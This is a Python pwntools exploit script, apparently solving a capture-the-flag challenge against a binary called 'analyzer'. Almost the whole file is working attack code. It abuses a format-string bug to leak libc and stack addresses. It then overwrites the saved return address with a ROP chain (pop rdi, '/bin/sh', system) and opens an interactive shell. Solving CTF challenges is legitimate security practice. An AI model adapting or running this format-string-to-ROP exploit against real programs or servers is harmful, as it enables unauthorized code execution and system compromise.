#!/usr/bin/env python3

from pwn import *

exe = ELF("analyzer_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")
# p =  remote('chal.osugaming.lol', 7273)
context.binary = exe
context.terminal = ["foot"]
p = process(exe.path)
gdb.attach(p, gdbscript='''


           ''')
        
def reverse(thehexint):
    reversed_hex3 = hex(thehexint)[2:][::-1]
    reverse3 = ''.join([reversed_hex3[i:i+2][::-1] for i in range(0, len(reversed_hex3), 2)])
    return reverse3.encode("utf-8")
def containtheaddress(thehexint):
    data = f'%{thehexint & 0xffff}c%6$hn'.encode()
    part1 = u64(data[0:8])
    part2 = u64(data[8:].ljust(8))
    log.info(hex(part1))
    log.info(hex(part2))
    p.sendlineafter(b'./analyzer):', b'b'*10 +  b'0b' +b'08' + b'b'*16 + b'0b' + b'10' + reverse(part1) + reverse(part2)  + b'0b'*9 + b'a'*20 + b'a'*12)



def write(thehexint, writeaddr): 

    temp =  0  
    package = {
                 thehexint & 0xffff: writeaddr & 0xffff , 
                 (thehexint >> 16) & 0xffff: (writeaddr + 2) & 0xffff,
                 (thehexint >> 32) & 0xffff: (writeaddr + 4) & 0xffff,

                     }
    part = sorted(package)
    # log.info(hex(package[part[0]]))
    # log.info(hex(package[part[1]]))
    # log.info(hex(package[part[2]]))
    for i in range(0,3):
        containtheaddress(package[part[i]])
        data = f'%{part[i]}c%85$hn'.encode()
        log.info(f'this is part {i} of addr {hex(writeaddr)}: ' + hex(part[i]))
        log.info(f'this is package part {i}: ' + hex(package[part[i]]))
        part1 = u64(data[0:8])
        part2 = u64(data[8:].ljust(8))
        p.sendlineafter(b'./analyzer):', b'b'*10 +  b'0b' +b'08' + b'b'*16 + b'0b' + b'10' + reverse(part1) + reverse(part2) + b'0b'*9 + b'a'*20 + b'a'*12)
def nulleverything(thehexint):       
    containtheaddress(thehexint)
    data = u64(f'%{0x00}c%85$n'.encode())
    p.sendlineafter(b'./analyzer):', b'b'*10 +  b'0b' +b'08' + b'b'*16 + b'0b' + b'10' + reverse(data) + reverse(data) + b'0b'*9 + b'a'*20 + b'a'*12)
    
    
    
    



def main():
    p.sendlineafter(b'./analyzer):', b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535312470000000' + b'0b'+ b'00' +b'a'*20 + b'aaaa')
    p.recvuntil( b'Player name: ')
    leak_addr = int(p.recv(14), 16)
    base_libc = leak_addr - 171408
    bin_sh = base_libc  + 1934968
    system_libc = base_libc + libc.symbols['system']
    pop_rdi = base_libc + 0x000000000002a3e5
    nop_libc = base_libc + 0x00000000000378df
    log.info(f'leak_addr: ' + hex(leak_addr))
    log.info(f'base_libc: ' + hex(base_libc))
    log.info(f'bin_sh: ' + hex(bin_sh))
    log.info(f'system_libc: ' + hex(system_libc))
    log.info(f'pop_rdi: ' + hex(pop_rdi))
    
    p.sendlineafter(b'./analyzer):', b'a'*10 +  b'0b' +b'08' + b'aabaaaaaabaaaaaa' + b'0b' + b'08' +  b'2535352470000000' + b'0b'+ b'00' +b'a'*20 + b'aaaa')
    p.recvuntil( b'Player name: ')
    stack_leak = int(p.recv(14), 16)
    saved_rip = stack_leak - 272
    log.info(f'stack_leak: ' + hex(stack_leak))
    log.info(f'saved_rip: ' + hex(saved_rip))
    log.info(b'reverse the hex: ' + reverse(saved_rip))
    ret = int(b'0x0000000000401a4b',16)
    write(nop_libc,saved_rip)
    write(pop_rdi,saved_rip + 8)
    write(bin_sh,saved_rip +16)
    write(system_libc,saved_rip +24)
    p.sendlineafter(b'./analyzer):', b'-1' )
    # context.terminal = ['foot']
    # gdb.attach(p, gdbscript='''
    #            # b*main+168
    #            # b*read_string
    #            # b*0x000000000040159e
    #            # b*hexs2bin
    #        # b*read_byte
    # b*0x401598
    #            # b*consume_bytes
    #            # b*0x401628
    #
    #            ''')





    p.interactive()


if __name__ == "__main__":
    main()
